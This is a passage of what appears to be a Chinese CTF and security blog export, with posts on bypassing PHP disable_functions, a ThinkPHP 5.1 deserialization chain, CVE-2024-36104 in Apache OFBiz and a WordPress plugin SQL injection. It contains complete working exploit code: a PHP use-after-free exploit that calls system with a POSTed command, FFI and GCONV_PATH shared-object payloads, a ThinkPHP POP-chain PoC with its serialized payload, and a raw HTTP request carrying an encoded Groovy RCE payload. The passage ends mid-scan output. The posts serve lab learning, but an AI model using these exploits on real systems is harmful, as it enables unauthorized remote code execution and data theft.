$fake_bkt_addr = $abc_addr + $fake_bkt_off;        $this-&gt;write($this-&gt;abc, 0x50, $fake_bkt_addr);        for($i = 0; $i &lt; 3; $i++) {            $this-&gt;write($this-&gt;abc, 0x58 + $i * 4, 1, 4);        }        # copy bucket zval        $function_zval = $this-&gt;str2ptr($this-&gt;abc, $fake_bkt_off);        for($i = 0; $i &lt; 12; $i++) {            $this-&gt;write($this-&gt;abc,  $fake_bkt_off + 0x70 + $i * 8,                 $this-&gt;leak2($function_zval, $i * 8));        }        # pwn        $this-&gt;write($this-&gt;abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);        $this-&gt;write($this-&gt;abc, $fake_bkt_off, $fake_bkt_addr + 0x70);        $spl1-&gt;offsetGet($cmd);        exit();    }}$y = [new Z()];json_encode([&amp;$y]);\n\n\n上传文件\n然后post传参pass就能执行命令了\n\n蚁剑自带插件\n这个没啥好说的，直接绕\n\nGC with Certain Destructors UAF关于uaf的利用涉及到底层了，这就不是我所了解的了，老老实实当脚本小子了\n手工\nexp地址\nexploits/php7-gc-bypass at master · mm0r1/exploits (github.com)\n上传exp\n&lt;?php# Author: https://github.com/mm0r1pwn($_POST[\"pass\"]);function pwn($cmd) {    global $abc, $helper, $backtrace;    class Vuln {        public $a;        public function __destruct() {             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace(); # ;)            if(!isset($backtrace[1]['args'])) { # PHP &gt;= 7.4                $backtrace = debug_backtrace();            }        }    }    class Helper {        public $a, $b, $c, $d;    }    function str2ptr(&amp;$str, $p = 0, $s = 8) {        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) {            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        }        return $address;    }    function ptr2str($ptr, $m = 8) {        $out = \"\";        for ($i=0; $i &lt; $m; $i++) {            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        }        return $out;    }    function write(&amp;$str, $p, $v, $n = 8) {        $i = 0;        for($i = 0; $i &lt; $n; $i++) {            $str[$p + $i] = chr($v &amp; 0xff);            $v &gt;&gt;= 8;        }    }    function leak($addr, $p = 0, $s = 8) {        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }        return $leak;    }    function parse_elf($base) {        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) {            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write                # handle pie                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec                $text_size = $p_memsz;            }        }        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    }    function get_basic_funcs($base, $elf) {        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) {            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {                $deref = leak($leak);                # 'constant' constant check                if($deref != 0x746e6174736e6f63)                    continue;            } else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {                $deref = leak($leak);                # 'bin2hex' constant check                if($deref != 0x786568326e6962)                    continue;            } else continue;            return $data_addr + $i * 8;        }    }    function get_binary_base($binary_leak) {        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) {            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) { # ELF header                return $addr;            }        }    }    function get_system($basic_funcs) {        $addr = $basic_funcs;        do {            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) { # system                return leak($addr + 8);            }            $addr += 0x20;        } while($f_entry != 0);        return false;    }    function trigger_uaf($arg) {        # str_shuffle prevents opcache string interning        $arg = str_shuffle(str_repeat('A', 79));        $vuln = new Vuln();        $vuln-&gt;a = $arg;    }    if(stristr(PHP_OS, 'WIN')) {        die('This PoC is for *nix systems only.');    }    $n_alloc = 10; # increase this value if UAF fails    $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(str_repeat('A', 79));    trigger_uaf('x');    $abc = $backtrace[1]['args'][0];    $helper = new Helper;    $helper-&gt;b = function ($x) { };    if(strlen($abc) == 79 || strlen($abc) == 0) {        die(\"UAF failed\");    }    # leaks    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) {        die(\"Couldn't determine binary base address\");    }    if(!($elf = parse_elf($base))) {        die(\"Couldn't parse ELF header\");    }    if(!($basic_funcs = get_basic_funcs($base, $elf))) {        die(\"Couldn't get basic_functions address\");    }    if(!($zif_system = get_system($basic_funcs))) {        die(\"Couldn't get zif_system address\");    }    # fake closure object    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) {        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    }    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();}\n\npost传参pass就可以了\n\n蚁剑\n老样子，用插件，没什么好说的\n\nFFI 扩展执行命令FFI 扩展已经通过RFC, 正式成为PHP7.4的捆绑扩展库, FFI 扩展允许 PHP 执行嵌入式 C 代码。\n\n简单来说\nFFI提供了高级语言直接的互相调用，而对于PHP来说，FFI让我们可以方便的调用C语言写的各种库\n传统的方式，当我们需要用一些已有的C语言的库的能力的时候，我们需要用C语言写wrapper，把他们包装成扩展，这个过程中就需要大家去学习PHP的扩展怎么写，当然现在也有一些方便的方式，比如Zephir. 但总还是有一些学习成本的，而有了FFI以后，我们就可以直接在PHP脚本中调用C语言写的库中的函数了。\n而C语言几十年的历史中，积累了大量的优秀的库，FFI直接让我们可以方便的享受这个庞大的资源了。\n手工\n&lt;?php# 创建了一个新的FFI（Foreign Function Interface）对象，并使用cdef方法定义了一个C语言的函数system。这个函数接受一个字符指针参数，并返回一个整数。在C语言中，system函数通常用于执行shell命令。$ffi = FFI::cdef(\"int system(const char *command);\");# 调用了上面定义的system函数，传递了一个字符串参数\"tac /flag &gt; /tmp/123\"。这个字符串是一个shell命令，它的功能是读取名为flag的文件（通常位于Web服务器的文档根目录），并将其内容以反向顺序写入$ffi-&gt;system(\"tac /flag &gt; /tmp/123\");# 使用PHP的file_get_contents函数读取/tmp/123文件的内容，并将其输出到屏幕上。echo file_get_contents(\"/tmp/123\");# 最后，这行代码使用PHP的unlink函数删除/tmp/123文件。使用@符号是为了抑制可能出现的错误消息。@unlink(\"/tmp/123\");\n\n上传之后访问页面\n\n蚁剑\n没什么好说的，直接用插件就行了\niconv执行命令php在执行iconv函数时，实际上是调用glibc中的iconv相关函数，其中一个很重要的函数叫做iconv_open()。\nphp的iconv函数的第一个参数是字符集的名字，这个参数也会传递到glibc的iconv_open函数的参数中。\n下面我们来看一下iconv_open函数的执行过程：\niconv_open函数首先会找到系统提供的gconv-modules文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置。然后再根据gconv-modules文件的指示去链接参数对应的.so文件。之后会调用.so文件中的gconv()与gonv_init()函数。然后就是一些与本漏洞利用无关的步骤。\n\n\nlinux系统提供了一个环境变量：GCONV_PATH，该环境变量能够使glibc使用用户自定义的gconv-modules文件，因此，如果指定了GCONV_PATH的值，iconv_open函数的执行过程会如下：\niconv_open函数依照GCONV_PATH找到gconv-modules文件。根据gconv-modules文件的指示找到参数对应的.so文件。调用.so文件中的gconv()和gonv_init()函数。一些其他步骤。\n\n首先上传gconv-modules文件于/tmp文件夹，其格式如下：\nmodule  自定义字符集名字（大写）//    INTERNAL    ../../../../../../../../tmp/自定义字符集名字（小写）    2module  INTERNAL    自定义字符集名字（大写）//    ../../../../../../../../tmp/自定义字符集名字（小写）    2\n\n\n我是写成\nmodule  HACK//    INTERNAL    ../../../../../../../../tmp/hack    2module  INTERNAL    HACK//    ../../../../../../../../tmp/hack    2\n\n\n再书写hack.c文件:\ninclude &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void gconv() {}void gconv_init() {  system(\"/readflag &gt; /tmp/flag\");}\n\n编译成.so文件\ngcc hack.c -o hack.so -shared -fPIC\n\n\n将生成的.so文件上传到/tmp。\n再上传shell.php\n&lt;?php    putenv(\"GCONV_PATH=/tmp/\");    iconv(\"hack\", \"UTF-8\", \"whatever\");?&gt;\n\n\n访问shell.php就能看到/tmp文件夹下有flag了\n蚁剑\n蚁剑还是太超标了\n总结实在是懒得手动就直接蚁剑解决了吧，但是手动也能学到一些东西\n","categories":["web"],"tags":["web"]},{"title":"ThinkPhp框架反序列化","url":"/2025/05/08/ThinkPhp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"ThinkPhp框架反序列化漏洞Thinkphp5.1反序列化链的调用\n反序列化的常见的知识反序列化的常见起点\n__wakeup 一定会调用\n__destruct 一定会调用\n__toString 当一个对象被反序列化后又被当做字符串使用\n反序列化的常见中间跳板:\n__toString 当一个对象被当做字符串使用\n__get 读取不可访问或不存在属性时被调用\n__set 当给不可访问或不存在属性赋值时被调用\n__isset 对不可访问或不存在的属性调用isset()或empty()时被调用\n形如 $this-&gt;$func();\n反序列化的常见终点:\n__call 调用不可访问或不存在的方法时被调用\ncall_user_func 一般php代码执行都会选择这里\ncall_user_func_array 一般php代码执行都会选择这里\n现在又多了phar反序列化的利用方式，能够反序列化其metadata部分，利用的范围增加了许多！\n还是得好好向大佬学习，直接渗透到框架中来了，网上的关于thinkphp反序列化的都看了一遍，建议已经有了php编程基础的和php反序列化基础的深究，脚本小子只需要拿着poc去打就可以了（bushi，我也想从脚本小子慢慢到深究原理，慢慢来吧\n源码是在buuctf中的下载的，自己分析thinkphp的代码，然后找到可以反序列化的地方，执行代码\n有能力的可以用docker自己搭一个环境然后运行这个代码，傻瓜式打法就是phpstudy搭一个环境，直接把源码放到www下运行就可以了\n话不多说，开始分析\nThinkphp反序列化的分析这一部分，看不看得懂其实无所谓，第一次看我也看不懂，只会跟着大佬调试，不知道他们这一步是为了什么，现在稍稍了解了一些，第一遍看的话千万不要深究，把后面的吃透来再回来看这个可能会更好一些\n按照惯例，找利用的入口，一般用__destruct()\n\n打开源码文件，全局搜索__destruct(),发现有很多文件，\n\n这里我们用到windows.php中的魔术方法，这里作为起点\n\n可以看到，__destruct()函数调用removeFiles函数，按住ctrl跟进removeFiles函数，直接跳转过去，看看有哪些文件调用了这个函数\n\n一个简单的for循环，遍历this-&gt;files数组，检查数组中的每一个元素是不是文件，那么就要求我们构造的poc中，windows类里，有files变量，并且是一个数组\n细心一点，你就会发现进行不下去了，但是，file_exists函数，是一个nb的函数，当传入的参数值是一个对象的时候，files_exists会调用__tostring方法，把这个对象转换成为一个字符串，然后再进行判断，这里又能确定一些东西：\n1.构造的poc中files白能量要是一个数组，数组的元素要是对象\n2.找到__tostring函数，进入下一站，全局搜索\n找到tostring方法在很多文件中，我们这里选择Conversion.php中，\n\n也就是说，我们现在是从windows类中跳到了Conversion类中，那么在poc构造的时候，就要想办法让这两者，通过继承或者是包含，产生一定的关系，要产生关系，这里用到了一个抽象的类\n\n\npivot类继承了model类\n这里，我们可以将files对象数组，写成pivot对象，这样，pivot是继承model类，不就找到了model类，进而找到了conversion类，从而调用__tostring()函数\n继续\n在Conversion类中，继续跟进\ntojson函数调用toarray方法\n\n继续跟进\n到了难的地方，一个一个的跟踪\n\n//只有当append变量不为空，才能往下，poc中append变量不能为空if (!empty($this-&gt;append)) {//开始遍历，并且是键值对，所以我们构造的append变量还得是一个键值对            foreach ($this-&gt;append as $key =&gt; $name) {            //判断name是不是数组，我们构造的append的值，要是一个数组                if (is_array($name)) {                //到了这里，我们要想办法让代码往下走                    // 追加关联对象属性                    $relation = $this-&gt;getRelation($key);                    if (!$relation) {                        $relation = $this-&gt;getAttr($key);                        if ($relation) {                            $relation-&gt;visible($name);                        }                    }\n\n上面的代码块，到了this-&gt;getRelation(key),无法进行，我们现在需要跳转到另一个类中\n\n这个函数，有三个分支，要让上面的代码往下走，所以if(!$relation)要为真所以relation就要为null，那么就是进入到第三个return\n//这里传过来的$name实际上是键值，要想最后返回为空，前面两个if都不能成立public function getRelation($name = null){//第一个if，传过来的参数不能为空，也就要求，构造的POC，键不能为空    if (is_null($name)) {        return $this-&gt;relation;//第二个if，要求，传过来的键，不能在$this-&gt;relation数组中，但是我往上翻，这个类定义的relation变量默认值为空//所以我们构造的时候，不传系统默认的，应该就没问题    } elseif (array_key_exists($name, $this-&gt;relation)) {        return $this-&gt;relation[$name];    }    return;}\n\n那么继续\n//如果getRelation($key)为空，那么$relation为空，那么，就可以往下进行                                       if (!$relation) {//这里继续把键值传给getAttr($key)函数，我们进入getAttr($key)函数\t\t\t\t\t$relation = $this-&gt;getAttr($key);\n\n\n在attribute类中找到了getattr函数，可以看到，getattr函数最后一行，就是要返回value的值，继续跟进getData函数\n\n我们来看详细代码\npublic function getData($name = null){//传过来的键值不为空，所以跳过这个if，进入下一个if    if (is_null($name)) {        return $this-&gt;data;//最后POC反序列化后，是进入到这里了，因为这里面我们可以在POC构造一个data变量（键值对），最后根据传过来的键，返回data中对应的值   //那么，第三个if中，relation为什么不能构造了？//因为上面说到getRelation()函数要返回空，所以array_key_exists($name, $this-&gt;relation)必须为false//综上所述，我们这里，在POC中，还需要构造一个data变量，并且也是个键值对的形式，并且键就是传过来的    } elseif (array_key_exists($name, $this-&gt;data)) {        return $this-&gt;data[$name];    } elseif (array_key_exists($name, $this-&gt;relation)) {        return $this-&gt;relation[$name];    }    throw new InvalidArgumentException('property not exists:' . static::class . '-&gt;' . $name);}\n\n所以，结论如下\n$relation = $this-&gt;getAttr($key) = $this-&gt;getData($name) = $this-&gt;data[$name]这里的$name，实际在传参时传的是$key，所以在Conversion类中$relation = this-&gt;data[$key]\n\n再次回到conversion类\n                    if (!empty($this-&gt;append)) {            foreach ($this-&gt;append as $key =&gt; $name) {                         if (is_array($name)) {                    // 追加关联对象属性                    $relation = $this-&gt;getRelation($key);                    if (!$relation) {                        $relation = $this-&gt;getAttr($key);//$relation = $this-&gt;data[$key]                                                if ($relation) {                //$relation现在的值为data[$key]，所以我们在构造POC时，data中不要又visible，为什么呢//在php中，如果调用不存在的方法时，会自动调用__call()函数，前提是这个对象实现了或者继承了__call()//在本例中，如果visible()函数不存在，会把visible和name作为参数传给__call()//那么关键问题//是_call()在哪？这里就要引入Request类了，因为，大佬们，通过全局搜索，搜索到了Request类里面有__call()//怎么和_call()扯上关系?如果$relation = $this-&gt;data[$key] = Request的对象呢？                            $relation-&gt;visible($name);                        }                    }\n\n进入request类\n代码分析，可以看到这个类中，不仅有call方法，还有call_user_func_array(),这个函数一般就是rce的最后一站\n在这里面搜索call_user_func()函数，如下图，所以我们要向RCE，就要控制1466行的call_user_func($filter, $value)，那么就要控制filter和value，但是value始终都会被上面的那个该死的array_unshift()改变，所以我们需要找到调用filterValue()的地方\n\n还是在request类中找到了input方法，但是这个方法中的data还是形参，不可控，再找找调用input的方法\n\n还在Request类中，找到了param()方法，但是这个 param()方法中的name还是形参，还是不可控，再找调用param方法的地方\n\n还在Request类中，找到了isAjax()方法，这里在调用param()方法时，不再是用形参了，我们可以构造了\n所以hook变量那里面，中转，要中转到isAjax()方法，并且我们要构造一个config变量\n\n找到了链的起始位置为isajax，而执行代码的位置为input()函数中的filtervalue函数，把代码汇总\n//在input()函数中//通过getData()函数获取用户的get以及post组成的数组，值为data//这个data会被当做filterValue()函数的第一个参数，并执行函数    protected function getData(array $data, $name)    {        foreach (explode('.', $name) as $val) {            if (isset($data[$val])) {                $data = $data[$val];            } else {                return;            }        }        return $data;    }//这里是对filter对象的的值进行一个赋值，从$filter = $filter ?: $this-&gt;filter//并且把赋值后的fileter传给filterValue()函数的第三个参数，并执行函数//所以我们需要构造一个fileter    protected function getFilter($filter, $default)    {        if (is_null($filter)) {            $filter = [];        } else {            $filter = $filter ?: $this-&gt;filter;            if (is_string($filter) &amp;&amp; false === strpos($filter, '/')) {                $filter = explode(',', $filter);            } else {                $filter = (array) $filter;            }        }        $filter[] = $default;        return $filter;    }    $this-&gt;filterValue($data, $name, $filter);        //input()函数之外//这里call_user_func($filter, $value)//call_user_func()的两个参数都来自filterValue()接收的参数//也就是说用户GET或POST传过来的参数，是call_user_func()的第二个也就是RCE的参数//POC构造的filter，是call_user_func()的第一个也就是最终执行的危险函数    private function filterValue(&amp;$value, $key, $filters)    {        $default = array_pop($filters);        foreach ($filters as $filter) {            if (is_callable($filter)) {                // 调用函数或者方法过滤                $value = call_user_func($filter, $value);            } elseif (is_scalar($value)) {                if (false !== strpos($filter, '/')) {                    // 正则过滤                    if (!preg_match($filter, $value)) {                        // 匹配不成功返回默认值                        $value = $default;                        break;                    }                } elseif (!empty($filter)) {                    // filter函数不存在时, 则使用filter_var进行过滤                    // filter为非整形值时, 调用filter_id取得过滤id                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));                    if (false === $value) {                        $value = $default;                        break;                    }                }            }        }        return $value;    }\n\n其实很多人是蒙的，我第一次看到这也是蒙的，因为这个链本身就很复杂，很多个转点，这里偷一张别人的图好理解\n\n漏洞复现，直接用buuctf在线环境打\nhttp://IP/public/?s=index/index/hello&amp;ethan=whoami\n\n//post传参str=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A5%3A%22ethan%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22calc.exe%22%3Bi%3A1%3Bs%3A4%3A%22calc%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22ethan%22%3BO%3A13%3A%22think%5CRequest%22%3A3%3A%7Bs%3A7%3A%22%00%2A%00hook%22%3Ba%3A1%3A%7Bs%3A7%3A%22visible%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A9%3Bi%3A1%3Bs%3A6%3A%22isAjax%22%3B%7D%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3Bs%3A9%3A%22%00%2A%00config%22%3Ba%3A1%3A%7Bs%3A8%3A%22var_ajax%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D%7D%7D\n\n\npoc&lt;?phpnamespace think;abstract class Model{    protected $append = [];    private $data = [];    function __construct(){        $this-&gt;append = [\"ethan\"=&gt;[\"calc.exe\",\"calc\"]];        $this-&gt;data = [\"ethan\"=&gt;new Request()];    }}class Request{    protected $hook = [];    protected $filter = \"system\";    protected $config = [        // 表单请求类型伪装变量        'var_method'       =&gt; '_method',        // 表单ajax伪装变量        'var_ajax'         =&gt; '_ajax',        // 表单pjax伪装变量        'var_pjax'         =&gt; '_pjax',        // PATHINFO变量名 用于兼容模式        'var_pathinfo'     =&gt; 's',        // 兼容PATH_INFO获取        'pathinfo_fetch'   =&gt; ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],        // 默认全局过滤方法 用逗号分隔多个        'default_filter'   =&gt; '',        // 域名根，如thinkphp.cn        'url_domain_root'  =&gt; '',        // HTTPS代理标识        'https_agent_name' =&gt; '',        // IP代理获取标识        'http_agent_ip'    =&gt; 'HTTP_X_REAL_IP',        // URL伪静态后缀        'url_html_suffix'  =&gt; 'html',    ];    function __construct(){        $this-&gt;filter = \"system\";        $this-&gt;config = [\"var_ajax\"=&gt;''];        $this-&gt;hook = [\"visible\"=&gt;[$this,\"isAjax\"]];    }}namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows{    private $files = [];    public function __construct()    {        $this-&gt;files=[new Pivot()];    }}namespace think\\model;use think\\Model;class Pivot extends Model{}use think\\process\\pipes\\Windows;echo urlencode(serialize(new Windows()));?&gt;\n\n头脑风暴！\n","categories":["web"],"tags":["web"]},{"title":"CVE-2024-36104","url":"/2025/07/18/cve-2024-36104/","content":"CVE-2024-36104路径遍历漏洞导致的rce成因是未对用户的输入的contextPath参数进行充分的验证，这使得未授权的攻击者能够通过精心构造的恶意请求绕过认证机制，进而访问系统中本应收到保护的敏感接口，最终引发rce\n漏洞受影响版本Apache OFBiz &lt; 18.12.14Fofa搜索语法app=”Apache_OFBiz”\n漏洞原理分析Apache采用ControlServet和ControlFilter来处理请求路径，其路由规则如下：在在默认设置下，请求路径被解析为：/webtools/control/，其中对应controller.xml文件所定义的接口。\n关键问题OFBiz的路径解析逻辑存在漏洞，未对路径层级进行严格校验，导致以下两种请求会被视为等效：\n\n合法路径：/webtools/control/ProgramExport\n嵌套路径：/webtools/control/forgotPassword/ProgramExport\n\n漏洞触发的根本原因接口权限控制失效forgotPassword是无需认证的公开接口，而ProgramExport是需要认证的高危接口。当用户访问/forgotPassword/ProgramExport时：权限检查：系统先检查forgotPassword的权限，允许访问。路由映射：后续路径ProgramExport被错误地当作子接口处理，绕过了ProgramExport本身的权限校验。\n漏洞利用中使用的%2e（.的URL编码）是显式的路径遍历。例如，/forgotPassword/%2e/%2e/ProgramExport等价于/ProgramExport。/webtools/control/forgotPassword;/ProgramExport也能成功访问。而直接访问/forgotPassword/ProgramExport能成功，是因为OFBiz的路由逻辑自动忽略了中间路径，本质上与路径遍历效果相同。官方修复方式验证在Apache OFBiz 18.12.14版本中，官方采取以下方式修复：\n\n严格路径校验要求请求路径必须精确匹配controller.xml中定义的接口，禁止多级路径嵌套。\n显式权限控制对ProgramExport等敏感接口强制进行二次鉴权。\n\n漏洞复现以春秋云境中的靶场为例\n直接给出poc\nPOST /webtools/control/forgotPassword/././ProgramExport HTTP/1.1、或者访问以下铭感路由https://127.0.0.1:8443/webtools/control/main/../ProgramExporthttps://127.0.0.1:8443/webtools/control/main/;/ProgramExporthttps://127.0.0.1:8443/webtools/control/main/%2e/%2e/ProgramExportHost: 39.106.48.123:36646Cookie: JSESSIONID=2A2143A74051B80F86479CE4543B034E.jvm1; OFBiz.Visitor=10000User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OpenWave/93.4.3797.32Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Sec-Ch-Ua-Platform: \"Windows\"Sec-Ch-Ua: \"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not=A?Brand\";v=\"24\"Sec-Ch-Ua-Mobile: ?0Priority: u=0, iTe: trailersConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 302groovyProgram=\\u0074\\u0068\\u0072\\u006f\\u0077\\u0020\\u006e\\u0065\\u0077\\u0020\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0028\\u0027\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067\\u0027\\u002e\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0028\\u0029\\u002e\\u0074\\u0065\\u0078\\u0074\\u0029\\u003b或者通俗版本POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1Host: &lt;目标IP&gt;:&lt;端口&gt;Content-Type: application/x-www-form-urlencodedContent-Length: 302groovyProgram=\\u0074\\u0068\\u0072\\u006f\\u0077\\u0020\\u006e\\u0065\\u0077\\u0020\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0028\\u0027\\u0069\\u0064\\u0027\\u002e\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0028\\u0029\\u002e\\u0074\\u0065\\u0078\\u0074\\u0029\\u003b\n\npost传参传入要执行的命令，这里执行的远程命令是\nthrow new Exception('cat /flag'.execute().text);\n\n直接看效果\n或者可以使用工具nuclei直接扫描\n\n危害\n未授权访问：攻击者无需认证，通过构造恶意请求，可绕过验证机制，访问本应受限的敏感接口，进而获取系统中敏感信息，如用户数据、商业机密等，严重威胁数据的保密性。\n远程代码执行：漏洞允许攻击者利用/webtools/control/ProgramExport接口的编程导出功能，执行任意 Groovy 代码，从而实现远程代码执行，完全控制受影响的系统，可进行数据篡改、删除、植入恶意软件等操作，对系统的完整性和可用性造成极大破坏。\n权限提升：攻击者可借此漏洞从低权限用户提升至高权限用户，进而执行更广泛的系统操作，对整个系统的安全构成严重威胁。\n中间人攻击风险：攻击者可利用该漏洞篡改系统返回给合法用户的响应内容，实施中间人攻击，进一步获取用户敏感信息或向用户传播恶意内容。\n大规模攻击风险：由于 Apache OFBiz 在电子商务领域的广泛应用，该漏洞的存在使得大量系统面临被攻击的风险，一旦被大规模利用，可能导致众多企业及用户的业务中断、数据泄露等严重后果，影响范围广泛。\n\n收获，一个新的工具和一个cve漏洞\n","categories":["web"],"tags":["cve"]},{"url":"/2025/07/18/wordpress%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/cve-2022-4230/wp%20statistics%E6%8F%92%E4%BB%B6sql%E6%B3%A8%E5%85%A5/","content":"wp statistics插件sql注入前言一个影响wordpress插件wp statistics的漏洞，存在于13.2.9之前的版本，主要由于参数未进行专一，允许经过身份验证的用户进行sql注入\n漏洞复现以春秋云境的靶场为例\n通过给定的路径 第一次访问主页\n空白的，什么都没有\n\n直接使用wpscan进行扫描，wpscan是一款专门针对wordpress平台的工具\n[+] URL: https://eci-2zeffbnu46168faf9ijh.cloudeci1.ichunqiu.com:80/ [8.141.24.111][+] Started: Fri Jul 18 20:16:25 2025Interesting Finding(s):[+] Headers | Interesting Entry: x-powered-by: PHP/7.4.33 | Found By: Headers (Passive Detection) | Confidence: 100%[+] robots.txt found: https://eci-2zeffbnu46168faf9ijh.cloudeci1.ichunqiu.com:80/robots.txt | Interesting Entries: |  - /wp-admin/ |  - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: https://eci-2zeffbnu46168faf9ijh.cloudeci1.ichunqiu.com:80/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: |  - http://codex.wordpress.org/XML-RPC_Pingback_API |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: https://eci-2zeffbnu46168faf9ijh.cloudeci1.ichunqiu.com:80/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: https://eci-2zeffbnu46168faf9ijh.cloudeci1.ichunqiu.com:80/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: |  - https://www.iplocation.net/defend-wordpress-from-ddos |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 6.1.1 identified (Insecure, released on 2022-11-15). | Found By: Rss Generator (Aggressive Detection) |  - https://eci-2zeffbnu46168faf9ijh.cloudeci1.ichunqiu.com:80/feed/, &lt;generator&gt;https://wordpress.org/?v=6.1.1&lt;/generator&gt; |  - https://eci-2zeffbnu46168faf9ijh.cloudeci1.ichunqiu.com:80/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.1.1&lt;/generator&gt; |  - http://eci-2zeffbnu46168faf9ijh.cloudeci1.ichunqiu.com/feed/, &lt;generator&gt;https://wordpress.org/?v=6.1.1&lt;/generator&gt;[i] The main theme could not be detected.[+] Enumerating All Plugins (via Passive Methods)[i] No plugins Found.[+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:08 &lt;=&gt; (137 / 137) 100.00% Time: 00:00:08[i] No Config Backups Found.[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Fri Jul 18 20:16:39 2025[+] Requests Done: 170[+] Cached Requests: 5[+] Data Sent: 55.425 KB[+] Data Received: 80.267 KB[+] Memory used: 249.469 MB[+] Elapsed 